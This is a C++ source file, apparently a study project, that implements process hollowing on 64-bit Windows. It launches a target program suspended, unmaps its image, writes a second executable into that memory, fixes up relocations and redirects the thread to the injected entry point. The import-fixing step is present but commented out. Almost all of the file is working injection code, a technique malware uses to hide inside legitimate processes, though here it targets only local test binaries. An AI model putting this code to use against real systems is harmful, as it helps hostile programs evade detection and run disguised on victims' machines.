#include <iostream>
#include <windows.h>
#include <string>
#include <winternl.h>
#include <DbgHelp.h>

using namespace std;

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess) (
	_In_ HANDLE ProcessHandle,
	_In_ PROCESSINFOCLASS ProcessInformationClass,
	_Out_ PVOID ProcessInformation,
	_In_ ULONG ProcessInformationLength,
	_Out_opt_ PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection) (
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	);

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

HMODULE hNTDLL = nullptr;
_NtQueryInformationProcess ntQueryInformationProcess = nullptr;

BOOL LoadNtQueryInformationProcess() {
	hNTDLL = LoadLibraryA("ntdll");
	if (hNTDLL == nullptr) {
		return false;
	}
	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
	if (fpNtQueryInformationProcess == nullptr) {
		return false;
	}
	ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	return true;
}

PPEB FindPEB(_In_ HANDLE hProcess) {
	if (ntQueryInformationProcess == nullptr) {
		if (!LoadNtQueryInformationProcess()) {
			return nullptr;
		}
	}
	PPROCESS_BASIC_INFORMATION ProcBasic = new PROCESS_BASIC_INFORMATION();
	ULONG ProcBasicLength = 0;
	ntQueryInformationProcess(hProcess, ProcessBasicInformation, ProcBasic, sizeof(PROCESS_BASIC_INFORMATION), &ProcBasicLength);
	return ProcBasic->PebBaseAddress;
}

BOOL ReadPEB(_In_ HANDLE hProcess, _Out_ PPEB pPEB) {
	if (ReadProcessMemory(hProcess, FindPEB(hProcess), (LPVOID)pPEB, sizeof(PEB), nullptr)) {
		return TRUE;
	}
	return FALSE;
}

DWORD RvaToFileOffset(DWORD rva,
	PIMAGE_NT_HEADERS64 nt,
	PIMAGE_SECTION_HEADER firstSection) {
	WORD nsec = nt->FileHeader.NumberOfSections;

	for (WORD i = 0; i < nsec; ++i) {
		PIMAGE_SECTION_HEADER sec = &firstSection[i];

		DWORD secVA = sec->VirtualAddress;
		DWORD secSize = sec->Misc.VirtualSize ?
			sec->Misc.VirtualSize :
			sec->SizeOfRawData;

		if (rva >= secVA && rva < secVA + secSize) {
			DWORD delta = rva - secVA;
			return sec->PointerToRawData + delta;  // ★ 只在 file layout 上用
		}
	}

	return 0;  // 没找到，通常说明文件有问题
}

PLOADED_IMAGE GetPEHeader(LPVOID PE) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)PE;
	PLOADED_IMAGE pLoadedImage = new LOADED_IMAGE();

	pLoadedImage->FileHeader = (PIMAGE_NT_HEADERS64)((BYTE*)PE + pDosHeader->e_lfanew);
	
	pLoadedImage->NumberOfSections = pLoadedImage->FileHeader->FileHeader.NumberOfSections;
	pLoadedImage->Sections = IMAGE_FIRST_SECTION(pLoadedImage->FileHeader);
	pLoadedImage->SizeOfImage = pLoadedImage->FileHeader->OptionalHeader.SizeOfImage;
	return pLoadedImage;
}

bool FixImports64_FileLayout(HANDLE hProcess,
	LPVOID remoteBase,
	LOADED_IMAGE* pLoadedImage,
	void* pBuffer) {
	BYTE* fileBase = (BYTE*)pBuffer;
	PIMAGE_NT_HEADERS64 nt = pLoadedImage->FileHeader;
	auto& opt = nt->OptionalHeader;

	// 1) 取 Import Directory
	auto& dir = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (dir.VirtualAddress == 0 || dir.Size == 0) {
		// 没有导入表，直接返回
		return true;
	}

	PIMAGE_SECTION_HEADER firstSec = IMAGE_FIRST_SECTION(nt);

	// 2) Import Directory RVA -> 文件偏移（file layout）
	DWORD impOff = RvaToFileOffset(dir.VirtualAddress, nt, firstSec);
	if (!impOff) {
		printf("RvaToFileOffset(import) failed\n");
		return false;
	}

	PIMAGE_IMPORT_DESCRIPTOR impDesc =
		(PIMAGE_IMPORT_DESCRIPTOR)(fileBase + impOff);

	printf("Starting import fixing...\n");

	// 3) 遍历每个 DLL 描述符
	for (; impDesc->Name != 0; ++impDesc) {
		// 3.1 读取 DLL 名
		DWORD nameOff = RvaToFileOffset(impDesc->Name, nt, firstSec);
		if (!nameOff) {
			continue;
		}

		const char* dllName = (const char*)(fileBase + nameOff);
		HMODULE hMod = LoadLibraryA(dllName);  // 在当前注入器进程中加载
		if (!hMod) {
			printf("LoadLibraryA failed for %s\n", dllName);
			continue;
		}

		// 3.2 取 INT (OriginalFirstThunk) 和 IAT (FirstThunk)
		DWORD origThunkRva = impDesc->OriginalFirstThunk ?
			impDesc->OriginalFirstThunk :
			impDesc->FirstThunk;

		DWORD origThunkOff = RvaToFileOffset(origThunkRva, nt, firstSec);
		if (!origThunkOff) {
			continue;
		}

		// 文件中的 INT（Thunk 数组），用 64 位结构
		PIMAGE_THUNK_DATA64 pOrigThunk =
			(PIMAGE_THUNK_DATA64)(fileBase + origThunkOff);

		// 远程进程中的 IAT 起始地址 = remoteBase + FirstThunk.RVA
		ULONGLONG remoteIAT = (ULONGLONG)remoteBase + impDesc->FirstThunk;

		// 3.3 遍历每个 thunk（逐个导入函数）
		for (; pOrigThunk->u1.AddressOfData != 0;
			++pOrigThunk,
			remoteIAT += sizeof(ULONGLONG)) {
			FARPROC func = nullptr;

			// 3.3.1 按序号导入
			if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
				WORD ord = (WORD)(pOrigThunk->u1.Ordinal & 0xFFFF);
				func = GetProcAddress(hMod, (LPCSTR)ord);
			}
			else {
				// 3.3.2 按名字导入
				DWORD ibnRva = (DWORD)pOrigThunk->u1.AddressOfData;
				DWORD ibnOff = RvaToFileOffset(ibnRva, nt, firstSec);
				if (!ibnOff) {
					continue;
				}

				PIMAGE_IMPORT_BY_NAME ibn =
					(PIMAGE_IMPORT_BY_NAME)(fileBase + ibnOff);
				const char* funcName = (const char*)ibn->Name;

				func = GetProcAddress(hMod, funcName);
			}

			if (!func) {
				// 这里你可以选择打印一下是哪个 DLL/函数失败
				// printf("GetProcAddress failed for %s!%s\n", dllName, funcName/ordinal);
				continue;
			}

			// 3.3.3 把 64 位函数地址写入远程 IAT（重点：8 字节）
			ULONGLONG funcAddr = (ULONGLONG)func;

			if (!WriteProcessMemory(hProcess,
				(LPVOID)remoteIAT,
				&funcAddr,
				sizeof(funcAddr),   // ★ 8 字节
				nullptr)) {
				printf("WriteProcessMemory IAT failed @ %p\n",
					(void*)remoteIAT);
			}
		}
	}

	printf("Import fixing done.\n");
	return true;
}




void CreateHollowingProcess(_In_ string target_path, _In_ string hollowing_path) {
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	CreateProcessA(
		target_path.c_str(),
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		pStartupInfo,
		pProcessInfo
	);

	if (!pProcessInfo->hProcess) {
		cout << "Error creating process." << endl;
		return;
	}
	PPEB pPEB = new PEB();
	ReadPEB(pProcessInfo->hProcess, pPEB);

	HANDLE hFile = CreateFileA
	(
		hollowing_path.c_str(),
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "Error opening " << hollowing_path << endl;
		return;
	}
	DWORD dwFileSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwFileSize + 1];
	memset(pBuffer, 0, dwFileSize + 1);
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, 0);
	CloseHandle(hFile);

	cout << "Unmapping target process." << endl;

	if (hNTDLL == nullptr) {
		hNTDLL = LoadLibraryA("ntdll");
	}
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	_NtUnmapViewOfSection ntUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
	PVOID ImageBaseAddress = pPEB->Reserved3[1];
	NTSTATUS ntStatus = ntUnmapViewOfSection(
		pProcessInfo->hProcess,
		ImageBaseAddress
	);

	if (ntStatus) {
		cout << "Unmapping sections fail" << endl;
		return;
	}

	PLOADED_IMAGE pLoadedImage = GetPEHeader(pBuffer);
	LPVOID pImage = VirtualAllocEx(pProcessInfo->hProcess, ImageBaseAddress, pLoadedImage->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pImage == nullptr) {
		cout << "VirutalAlloc fail: " << GetLastError() << endl;
		return;
	}
	else {
		printf("VirtualAlloc address: 0x%p, == ImageBase ? %d\n", pImage, (ULONGLONG)pImage == (ULONGLONG)ImageBaseAddress);
	}
	ULONGLONG RelcDelta = (ULONGLONG)ImageBaseAddress - pLoadedImage->FileHeader->OptionalHeader.ImageBase;
	printf("Target image base: 0x%p\n", ImageBaseAddress);
	printf("Hollowing image base: 0x%p\n", pLoadedImage->FileHeader->OptionalHeader.ImageBase);
	printf("Image base delta: 0x%llx\n", RelcDelta);

	pLoadedImage->FileHeader->OptionalHeader.ImageBase = (ULONGLONG)ImageBaseAddress;



	MEMORY_BASIC_INFORMATION mbi = { 0 };
	if (VirtualQueryEx(pProcessInfo->hProcess, ImageBaseAddress, &mbi, sizeof(mbi)) == sizeof(mbi)) {
		std::cout << "State = " << std::hex << mbi.State
			<< " Protect = " << mbi.Protect
			<< " Type = " << mbi.Type << std::dec << std::endl;
	}

	BOOL WriteProcRes = WriteProcessMemory(pProcessInfo->hProcess, ImageBaseAddress, pBuffer, pLoadedImage->FileHeader->OptionalHeader.SizeOfHeaders, nullptr);
	if (!WriteProcRes) {
		cout << "Write process header fail: " << GetLastError() << endl;
		return;
	}

	for (ULONG i = 0; i < pLoadedImage->NumberOfSections; i++) {
		ULONGLONG des = (ULONGLONG)ImageBaseAddress + pLoadedImage->Sections[i].VirtualAddress;
		//忽略.bss
		if (pLoadedImage->Sections[i].PointerToRawData == 0) continue;
		if (!WriteProcessMemory(pProcessInfo->hProcess, (LPVOID)des, (LPCVOID)((ULONGLONG)pBuffer + pLoadedImage->Sections[i].PointerToRawData), pLoadedImage->Sections[i].SizeOfRawData, nullptr)) {
			cout << "Write section " << pLoadedImage->Sections[i].Name << "error" << endl;
		}
		printf("Section %s write at 0x%llx\n", pLoadedImage->Sections[i].Name, des);
	}

	if (RelcDelta) {
		cout << "Starting relocation fixing" << endl;
		PIMAGE_SECTION_HEADER RelcSection = nullptr;
		for (ULONG i = 0; i < pLoadedImage->NumberOfSections; i++) {
			if (!memcmp(pLoadedImage->Sections[i].Name, ".reloc", 6)) {
				RelcSection = &pLoadedImage->Sections[i];
				break;
			}
		}
		if (RelcSection == nullptr) {
			cout << "Cannot find section .reloc" << endl;
			return;
		}
		IMAGE_DATA_DIRECTORY RelcData = pLoadedImage->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		ULONG RelcAddr = RelcSection->PointerToRawData;

		PIMAGE_BASE_RELOCATION pRelcBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pBuffer + RelcAddr);
		for (ULONG offset = 0; offset < RelcData.Size; offset = offset + pRelcBaseBlock->SizeOfBlock) {
			pRelcBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pBuffer + RelcAddr + offset);
			PBASE_RELOCATION_ENTRY pRelcEntry = (PBASE_RELOCATION_ENTRY)((ULONGLONG)pRelcBaseBlock + sizeof(IMAGE_BASE_RELOCATION));
			ULONG EntryCount = (pRelcBaseBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
			for (ULONG i = 0; i < EntryCount; i++) {
				if (pRelcEntry[i].Type != IMAGE_REL_BASED_DIR64) continue;
				ULONGLONG ullBuffer = 0;
				ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)((ULONGLONG)ImageBaseAddress + pRelcBaseBlock->VirtualAddress + pRelcEntry[i].Offset), &ullBuffer, sizeof(ULONGLONG), nullptr);
				//printf("Relocationg: 0x%llx -> 0x%llx\n", ullBuffer, ullBuffer + RelcDelta);
				ullBuffer += RelcDelta;
				WriteProcessMemory(pProcessInfo->hProcess, (LPVOID)((ULONGLONG)ImageBaseAddress + pRelcBaseBlock->VirtualAddress + pRelcEntry[i].Offset), &ullBuffer, sizeof(ULONGLONG), nullptr);
			}
		}
	}

	//FixImports64_FileLayout(pProcessInfo->hProcess, ImageBaseAddress, pLoadedImage, pBuffer);

	LPCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_ALL;
	
	if (!GetThreadContext(pProcessInfo->hThread, lpContext)) {
		cout << "Cannot get thread" << endl;
		return;
	}
	lpContext->Rcx = (ULONGLONG)ImageBaseAddress + pLoadedImage->FileHeader->OptionalHeader.AddressOfEntryPoint;
	if (!SetThreadContext(pProcessInfo->hThread, lpContext)) {
		cout << "Cannot set thread" << endl;
		return;
	}
	cout << "Resuming thread" << endl;
	if (ResumeThread(pProcessInfo->hThread) == -1) {
		cout << "Resuming thread fail" << endl;
		return;
	}

	CloseHandle(pProcessInfo->hProcess);
}

int main() {
	string hollowing_path = "G:\\GitHub\\Process-Hollowing\\sourcecode\\x64\\Debug\\Helloworld641.exe";
	string target_path = "G:\\GitHub\\Process-Hollowing\\sourcecode\\x64\\Debug\\Helloworld64.exe";

	CreateHollowingProcess(target_path, hollowing_path);
}

